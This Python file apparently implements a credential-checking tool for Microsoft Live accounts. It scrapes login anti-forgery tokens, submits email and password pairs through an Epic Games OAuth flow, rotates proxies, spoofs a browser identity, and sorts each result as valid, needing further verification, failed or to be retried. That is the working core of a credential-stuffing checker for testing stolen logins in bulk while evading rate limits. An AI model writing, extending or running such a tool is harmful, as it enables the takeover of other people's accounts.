import re
import requests
from bs4 import BeautifulSoup

class LiveAuthenticator:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })

    def _get_login_page(self):
        url = "https://login.live.com/oauth20_authorize.srf"
        params = {
            "client_id": "82023151-c27d-4fb5-8551-10c10724a55e",
            "redirect_uri": "https://accounts.epicgames.com/OAuthAuthorized",
            "response_type": "code",
            "scope": "xboxlive.signin",
            "display": "popup"
        }
        resp = self.session.get(url, params=params, timeout=15)
        resp.raise_for_status()
        return resp.text

    def _extract_ppft(self, html):
        match = re.search(r'name="PPFT" value="([^"]+)"', html)
        if match:
            return match.group(1)
        soup = BeautifulSoup(html, 'html.parser')
        tag = soup.find('input', {'name': 'PPFT'})
        if tag and tag.get('value'):
            return tag['value']
        raise Exception("PPFT token not found")

    def _extract_url_post(self, html):
        match = re.search(r'urlPost\s*:\s*"([^"]+)"', html)
        if match:
            return match.group(1)
        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form', {'name': 'loginForm'}) or soup.find('form', {'id': 'loginForm'})
        if form and form.get('action'):
            return form['action']
        return "/ppsecure/post.srf"

    def _extract_hpgid(self, html):
        match = re.search(r'"hpgid":(\d+)', html)
        if match:
            return match.group(1)
        return ""

    def _extract_canary(self, html):
        match = re.search(r'"canary":"([^"]+)"', html)
        if match:
            return match.group(1)
        return ""

    def authenticate(self, email, password, proxy_config=None):
        self.session.cookies.clear()
        if proxy_config and isinstance(proxy_config, dict):
            self.session.proxies.clear()
            self.session.proxies.update(proxy_config)

        try:
            html = self._get_login_page()
            ppft = self._extract_ppft(html)
            url_post = self._extract_url_post(html)
            hpgid = self._extract_hpgid(html)
            canary = self._extract_canary(html)

            if not url_post.startswith("https://"):
                url_post = "https://login.live.com" + url_post

            login_data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": ppft,
                "hpgid": hpgid,
                "canary": canary,
                "type": "11",
                "LoginOptions": "3",
                "i13": "0",
                "i19": "21648",
                "ps": "2",
                "psRNGCDefaultType": "1",
                "PPSX": "Passp",
                "NewUser": "1",
                "FoundMSAs": "",
                "fspost": "0",
                "i21": "0",
                "CookieDisclosure": "0",
                "IsFidoSupported": "1",
                "isSignupPost": "0",
                "isRecoveryAttemptPost": "0",
                "i18": "0",
                "i17": "0"
            }

            post_headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/oauth20_authorize.srf",
                "User-Agent": self.session.headers["User-Agent"]
            }

            resp = self.session.post(url_post, data=login_data, headers=post_headers, timeout=20, allow_redirects=True)

            if "sSigninName" in resp.text or "PPAuth" in resp.text:
                return ["ok", resp.cookies.get("X-OWA-CANARY", "")]
            if "https://accounts.epicgames.com" in resp.url or "OAuthAuthorized" in resp.url:
                return ["ok", resp.cookies.get("X-OWA-CANARY", "")]
            if "recover?mkt" in resp.text or "confirm?mkt" in resp.text or "Help us protect your account" in resp.text:
                return ["nfa"]
            if "Your account or password is incorrect" in resp.text or "That Microsoft account doesn't exist" in resp.text:
                return ["fail"]
            if "Too Many Requests" in resp.text or "AC:null,urlFedConvertRename" in resp.text:
                return ["retry"]
            return ["fail"]

        except Exception:
            return ["retry"]